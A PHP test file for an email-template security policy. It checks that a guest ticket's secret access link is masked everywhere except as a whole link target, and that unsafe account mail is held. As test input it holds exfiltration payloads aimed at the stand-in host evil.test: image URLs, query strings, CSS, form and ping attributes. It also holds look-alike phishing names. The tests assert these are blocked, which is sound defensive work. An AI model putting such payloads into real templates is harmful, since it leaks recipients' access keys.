<?php

use App\Contracts\Auth\AuthMailer;
use App\Data\Notifications\SensitiveValue;
use App\Models\User;
use App\Modules\Core\Models\ActivityLog;
use App\Modules\Core\Models\Client;
use App\Modules\Notifications\Data\EmailRequest;
use App\Modules\Notifications\Mail\TemplatedMail;
use App\Modules\Notifications\Models\EmailMessage;
use App\Modules\Notifications\Models\EmailTemplate;
use App\Modules\Notifications\Rendering\TemplateEngine;
use App\Modules\Notifications\Services\MergeContext;
use App\Modules\Notifications\Services\NotificationMailer;
use App\Modules\Notifications\Services\RecipientResolver;
use App\Modules\Notifications\Support\SecretTemplatePolicy;
use App\Modules\Notifications\Webhooks\WebhookPublisher;
use App\Support\Dashboard\Dashboard;
use Dom\HTMLDocument;
use Illuminate\Auth\Notifications\VerifyEmail;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Notification;

require_once __DIR__.'/helpers.php';
require_once __DIR__.'/../Support/helpers.php';

/*
 * Security review PR #28, B1 round 3: a SensitiveValue (the guest ticket link) is placed structurally — after
 * Markdown becomes HTML, only as the entire href of an <a>, and on a system-written line in the text part — and is
 * masked everywhere else, whatever the template's text does.
 */

const GUEST_URL = 'http://localhost/support/tickets/482913?key=GUESTKEY';

dataset('nested sensitive links', [
    'inside a Markdown image URL' => ["![p](https://evil.test/p.png?[x]({{ ticket.url }}))\n\nHi"],
    'inside an HTML src' => ["<img src=\"https://evil.test/p.png?[x]({{ ticket.url }})\">\n\nHi"],
    'inside another link\'s URL' => ['Hi [Open](https://evil.test/go?[x]({{ ticket.url }})) there'],
    'in another link\'s query string' => ['Hi [Open](https://evil.test/go?u={{ ticket.url }}) there'],
    'in an HTML href query string' => ['Hi <a href="https://evil.test/go?u={{ ticket.url }}">Open</a> there'],
    'as an image source' => ['![p]({{ ticket.url }})'],
    'in another attribute' => ['<a href="https://evil.test/" title="{{ ticket.url }}">Open</a>'],
    'as a link label' => ['[{{ ticket.url }}]({{ ticket.url }})'],
    'as plain text' => ['Your link: {{ ticket.url }}'],
]);

/**
 * @return array{0: string, 1: string} [html, text]
 */
function sendGuestTicketMail(string $body): array
{
    Mail::fake();
    seedEmailTemplates();
    EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole()->translations()->update(['body' => $body]);
    $context = ['ticket' => ['number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High', 'url' => new SensitiveValue(GUEST_URL, allowedIn: ['ticket.*'])]];

    app(NotificationMailer::class)->send(new EmailRequest('ticket.autoresponse', app(RecipientResolver::class)->addresses(['guest@example.test']), $context, 'guest|'.md5($body)));

    $parts = [];
    Mail::assertSent(TemplatedMail::class, function (TemplatedMail $mail) use (&$parts): bool {
        $parts = [(string) $mail->htmlBody, (string) $mail->plainText];

        return true;
    });

    return $parts;
}

/**
 * Every place the key appears in the HTML must be the whole href of a link: nowhere else, never on another host.
 */
function keyOnlyInLinkHrefs(string $html): bool
{
    $document = HTMLDocument::createFromString($html, LIBXML_NOERROR);
    $inHrefs = 0;

    foreach ($document->querySelectorAll('a[href]') as $link) {
        $href = (string) $link->getAttribute('href');
        $inHrefs += str_contains($href, 'GUESTKEY') ? 1 : 0;

        if (str_contains($href, 'GUESTKEY') && $href !== GUEST_URL) {
            return false;
        }
    }

    return substr_count($html, 'GUESTKEY') === $inHrefs;
}

/**
 * In the text part the key appears only on a line of its own: "Label: <guest link>".
 */
function keyOnlyOnOwnLines(string $text): bool
{
    foreach (preg_split('/\R/', $text) ?: [] as $line) {
        if (str_contains($line, 'GUESTKEY') && (! str_ends_with($line, ': '.GUEST_URL) || substr_count($line, 'GUESTKEY') !== 1 || str_contains($line, 'evil.test'))) {
            return false;
        }
    }

    return true;
}

it('rejects a nested or misplaced guest link on save', function (string $body) {
    seedEmailTemplates();

    expect(SecretTemplatePolicy::violations('ticket.autoresponse', ['subject' => 'Re: ticket', 'body' => $body]))->toHaveKey('body');
})->with('nested sensitive links');

it('rejects it over HTTP too', function () {
    seedEmailTemplates();
    actingAsStaff(['notifications.templates.view', 'notifications.templates.manage']);
    confirmPassword();
    $template = EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole();

    $this->put(route('admin.notifications.templates.update', $template), [
        'name' => $template->name, 'locale' => 'en', 'subject' => 'We got it',
        'body' => "We got it.\n\n![](https://evil.test/p.png?[x]({{ ticket.url }}))\n\n[View ticket]({{ ticket.url }})",
    ])->assertSessionHasErrors('body');

    expect($template->translations()->where('locale', 'en')->sole()->body)->not->toContain('evil.test');
});

it('accepts the link as a whole link target in the body', function () {
    seedEmailTemplates();

    expect(SecretTemplatePolicy::violations('ticket.autoresponse', ['subject' => 'Re: ticket', 'body' => "We got it.\n\n[View ticket]({{ ticket.url }})\n\nOr [open it here]({{ ticket.url }})."]))->toBe([])
        ->and(SecretTemplatePolicy::violations('ticket.autoresponse', ['subject' => '{{ ticket.url }}', 'body' => 'x']))->toHaveKey('subject');
});

it('never puts the key anywhere but a link\'s whole href when the template was written to the database directly', function (string $body) {
    [$html, $text] = sendGuestTicketMail($body."\n\n[View ticket]({{ ticket.url }})");

    expect(keyOnlyInLinkHrefs($html))->toBeTrue()
        ->and($html)->toContain('href="'.e(GUEST_URL).'"')
        ->and(preg_match('/evil\.test[^"\s]*GUESTKEY/', $html))->toBe(0)
        ->and(keyOnlyOnOwnLines($text))->toBeTrue()
        ->and($text)->toContain('View ticket: '.GUEST_URL);
})->with('nested sensitive links');

it('drops what could read or forward a revealed link: style sheets, forms, ping and handlers', function () {
    [$html] = sendGuestTicketMail("<style>a[href*=\"GUESTKEY\"]{background:url(https://evil.test/x.png)}</style>\n\n<form action=\"https://evil.test/f\"><button>Go</button></form>\n\n<a href=\"{{ ticket.url }}\" ping=\"https://evil.test/ping\" onclick=\"x()\">View ticket</a>");

    expect($html)->toContain('href="'.e(GUEST_URL).'"')
        ->not->toContain('evil.test')
        ->not->toContain('onclick')
        ->and(keyOnlyInLinkHrefs($html))->toBeTrue();
});

it('moves an inline link onto its own line in the text part', function () {
    [, $text] = sendGuestTicketMail('Please [open your ticket]({{ ticket.url }}) to reply.');

    expect($text)->toContain('Please open your ticket to reply.')
        ->toContain("\nopen your ticket: ".GUEST_URL)
        ->and(keyOnlyOnOwnLines($text))->toBeTrue();
});

it('gets the guest link from Support as a SensitiveValue for ticket mail only, end to end', function () {
    Mail::fake();
    seedEmailTemplates();
    EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole()->update(['bcc' => ['archive@example.test']]);

    $ticket = guestTicket(email: 'gina@example.test');
    $url = data_get(app(MergeContext::class)->ticket($ticket->id), 'ticket.url');

    expect($url)->toBeInstanceOf(SensitiveValue::class)->allowedIn->toBe(['ticket.*']);
    Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail): bool => $mail->hasTo('gina@example.test')
        && str_contains((string) $mail->htmlBody, 'key='.$ticket->access_key) && $mail->bcc === []);
    expect(EmailMessage::query()->where('template_key', 'ticket.autoresponse')->sole())
        ->has_redactions->toBeTrue()->bcc->toBeNull()
        ->body_html->not->toContain($ticket->access_key)
        ->body_text->not->toContain($ticket->access_key);
});

it('masks a SensitiveValue when cast to a string or JSON, and never allows it in custom or ad-hoc mail', function () {
    $value = new SensitiveValue('https://localhost/x?key=SECRET', allowedIn: ['ticket.*', 'custom.*', 'adhoc']);

    expect((string) $value)->toBe('••••')
        ->and(json_encode(['url' => $value], JSON_UNESCAPED_UNICODE))->toBe('{"url":"••••"}')
        ->and($value->allowedIn('ticket.reply'))->toBeTrue()
        ->and($value->allowedIn('custom.copy'))->toBeFalse()
        ->and($value->allowedIn('adhoc'))->toBeFalse()
        ->and($value->allowedIn('invoice.created'))->toBeFalse();
});

it('never prints a SensitiveValue from the engine', function () {
    $result = (new TemplateEngine)->render('[a]({{ link }}) {{ link | upper }} {{ link | default("x") }}', ['link' => new SensitiveValue('https://localhost/?key=SECRET')]);

    expect($result->output)->not->toContain('SECRET')
        ->and($result->warnings)->not->toBeEmpty();
});

it('renders secret templates against the allow-list only, with URL-like text removed from account-controlled names', function () {
    $context = SecretTemplatePolicy::textContext([
        'company.name' => 'ignored', 'company' => ['name' => 'Acme Hosting'],
        'user' => ['first_name' => 'Bob evil.test/login https://evil.test/x', 'email' => 'bob@evil.test'],
        'client' => ['company_name' => 'Go to https://evil.test/login'],
        'support' => ['email' => 'help@acme.test', 'url' => 'https://evil.test/support'],
        'auth' => ['reset_url' => new SensitiveValue('https://localhost/reset/T')],
    ]);

    expect($context)->toBe([
        'company' => ['name' => 'Acme Hosting'],
        'user' => ['first_name' => 'Bob'],
        'staff' => ['first_name' => null],
        'auth' => ['expires_at' => null],
        'support' => ['email' => 'help@acme.test'],
        'system' => ['today' => null],
    ]);
});

it('keeps account-controlled values from putting a look-alike link in the reset mail', function () {
    Mail::fake();
    seedEmailTemplates();
    EmailTemplate::query()->where('key', 'auth.password_reset')->sole()->translations()->update(['body' => 'Hello {{ user.first_name }} of {{ client.company_name }} at {{ user.email }}']);
    $user = User::factory()->create(['name' => 'evil.test/login Bob']);
    Client::factory()->create(['company_name' => 'Go to https://evil.test/login'])->users()->attach($user->id);

    app(AuthMailer::class)->sendPasswordReset($user, 'TOKEN123');

    Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail): bool => ! str_contains((string) $mail->htmlBody.$mail->plainText, 'evil.test')
        && str_contains((string) $mail->plainText, 'TOKEN123'));
});

it('rejects {% %} blocks in secret templates on save', function () {
    expect(SecretTemplatePolicy::violations('auth.password_reset', ['subject' => 'Reset', 'heading' => 'Reset', 'action_label' => 'Go', 'body' => '{% if user.first_name %}Hi{% endif %}']))
        ->toHaveKey('body');
});

it('strips SensitiveValues from webhook payloads even without a token-like query string', function () {
    $clean = app(WebhookPublisher::class)->sanitize(['ticket' => ['number' => '482913', 'url' => new SensitiveValue('https://localhost/support/tickets/482913/plain')]]);

    expect($clean)->toBe(['ticket' => ['number' => '482913']]);
});

it('fails closed for verification links too: no mail, no fallback, a security entry', function () {
    Mail::fake();
    Notification::fake();
    seedEmailTemplates();
    VerifyEmail::createUrlUsing(fn ($user): string => 'https://portal.example.test/verify/'.$user->id);
    $user = User::factory()->unverified()->create();

    try {
        app(AuthMailer::class)->sendEmailVerification($user);
    } finally {
        VerifyEmail::$createUrlCallback = null;
    }

    Mail::assertNothingSent();
    Mail::assertNothingQueued();
    Notification::assertNothingSent();
    expect(EmailMessage::query()->count())->toBe(0)
        ->and(ActivityLog::query()->where('description', 'Account email blocked: link host not allowed')->sole()->properties)
        ->toMatchArray(['kind' => 'email verification', 'host' => 'portal.example.test']);
});

it('says why account mail is held when APP_URL is http:// in production', function () {
    Mail::fake();
    Notification::fake();
    seedEmailTemplates();
    config(['app.url' => 'http://billing.example.test']);
    app()->detectEnvironment(fn (): string => 'production');
    $user = User::factory()->create();

    try {
        app(AuthMailer::class)->sendPasswordReset($user, 'TOKEN123');
        $health = collect(app(Dashboard::class)->resolveHealth('admin', fullAdministrator()))->firstWhere('key', 'notifications.account_links');
    } finally {
        app()->detectEnvironment(fn (): string => 'testing');
    }

    Mail::assertNothingSent();
    Notification::assertNothingSent();
    expect(ActivityLog::query()->where('event', 'security')->sole()->properties['reason'])->toContain('must use https://')
        ->and($health)->toMatchArray(['value' => 'Held', 'tone' => 'danger'])
        ->and($health['detail'])->toContain('emails are held');
});
